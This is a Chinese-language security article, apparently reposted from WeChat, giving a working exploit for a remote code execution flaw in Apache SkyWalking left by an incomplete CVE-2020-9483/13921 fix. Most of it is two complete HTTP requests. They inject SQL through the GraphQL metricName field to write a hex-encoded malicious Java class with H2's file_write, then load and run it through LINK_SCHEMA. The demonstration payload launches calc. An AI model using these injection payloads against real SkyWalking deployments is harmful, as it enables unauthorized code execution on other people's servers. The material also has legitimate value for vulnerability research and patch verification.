> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3UVd0X5y7egtxlc7IA2COQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/aPmkR80bcV3fU75DZYJR5nhOzYCE7icyORbS1QJudZebQM48HqU6ibDd82eZx1MFbcXfk77tbtY2IL8TGGD1j3fg/640?wx_fmt=jpeg)  

        Skywalking 远程代码执行漏洞，为 CVE-2020-9483、CVE-2020-13921 修复不完善遗留注入点，可被进一步了利用执行代码。

漏洞地址： https://github.com/apache/skywalking/pull/6246/files

[https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw](https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&mid=2247485925&idx=1&sn=832464e9ab5c0272c1f8b9e714a35185&scene=21#wechat_redirect)

环境
--

Skywalking 测试环境 JDK1.8，恶意类为 JDK1.7 编译。

![](https://mmbiz.qpic.cn/mmbiz_gif/aPmkR80bcV3fU75DZYJR5nhOzYCE7icyONEm5RhXqXOKSYLF5VkqVH5po62SPcT3mpgIibvGxGCq0WqvL7ITDmNg/640?wx_fmt=gif)

写入恶意类文件
-------

将恶意类编译并转为十六进制数据，为`file_write`方法的第一个参数赋值，第二个参数为 class 文件名。

恶意类 EvilClass.java 和 转十六进制工具代码 ToHexTools.java 均在项目中。

执行 ToHexTools.java 会将 EvilClass.class 文件内容转码为十六进制形式，输出为 file.hex 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3fU75DZYJR5nhOzYCE7icyObufjq3sYOrtOaSL270v5bQEYPxdq3T6DtHA9VNqicemPglzwicxeBzJw/640?wx_fmt=png)

```
POST /graphql HTTP/1.1
Host: 192.168.18.240:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 2152
Origin: http://192.168.18.240:8080
Connection: close
Referer: http://192.168.18.240:8080/log

{
     "query": "query queryLogs($condition: LogQueryCondition) {
        logs: queryLogs(condition: $condition) {
            data: logs {
                serviceName serviceId serviceInstanceName serviceInstanceId endpointName endpointId traceId timestamp isError statusCode contentType content
            }
            total
        }
    }",
    "variables": {
        "condition": {
            "metricName": "INFORMATION_SCHEMA.USERS union  all select file_write('cafebabe0000003100280a000800190a001a001b08001c0a001a001d07001e0a0005001f0700200700210100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000b4c4576696c436c6173733b0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b2956010004617267730100135b4c6a6176612f6c616e672f537472696e673b0100083c636c696e69743e010001650100154c6a6176612f696f2f494f457863657074696f6e3b01000a536f7572636546696c6501000e4576696c436c6173732e6a6176610c0009000a0700220c0023002401000463616c630c002500260100136a6176612f696f2f494f457863657074696f6e0c0027000a0100094576696c436c6173730100106a6176612f6c616e672f4f626a6563740100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000f7072696e74537461636b547261636500210007000800000000000300010009000a0001000b0000002f00010001000000052ab70001b100000002000c00000006000100000005000d0000000c000100000005000e000f00000009001000110001000b0000002b0000000100000001b100000002000c00000006000100000010000d0000000c00010000000100120013000000080014000a0001000b000000540002000100000012b800021203b6000457a700084b2ab60006b1000100000009000c00050002000c000000160005000000080009000b000c0009000d000a0011000c000d0000000c0001000d000400150016000000010017000000020018','EvilClass.class'))a where 1=? or 1=? or 1=? --",
            "endpointId":"1",
             "traceId":"1",
             "state":"ALL",
             "stateCode":"1",
             "paging":{
              "pageNum": 1,
              "pageSize": 1,
              "needTotal": true
           }
        }
    }
}
```

成功写入 EvilClass.class 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3fU75DZYJR5nhOzYCE7icyOWYCYrL2bwUyYNxN2yOd5cVK13xIpfX5oYcVquhoba6f7iaCHIS8RtGg/640?wx_fmt=png)

加载执行恶意类
-------

`LINK_SCHEMA` 的第二个参数值为要加载的文件名。

```
POST /graphql HTTP/1.1
Host: 192.168.18.240:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 791
Origin: http://192.168.18.240:8080
Connection: close
Referer: http://192.168.18.240:8080/log

{
     "query": "query queryLogs($condition: LogQueryCondition) {
        logs: queryLogs(condition: $condition) {
            data: logs {
                serviceName serviceId serviceInstanceName serviceInstanceId endpointName endpointId traceId timestamp isError statusCode contentType content
            }
            total
        }
    }",
    "variables": {
        "condition": {
            "metricName": "INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','EvilClass','jdbc:h2:./test2','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --",
            "endpointId":"1",
             "traceId":"1",
             "state":"ALL",
             "stateCode":"1",
             "paging":{
              "pageNum": 1,
              "pageSize": 1,
              "needTotal": true
           }
        }
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3fU75DZYJR5nhOzYCE7icyO5UvmUibaTIhmFw6iazFr8E5fsr54DjeB7h4odTQ9GQFzMm40Oqtb8foQ/640?wx_fmt=png)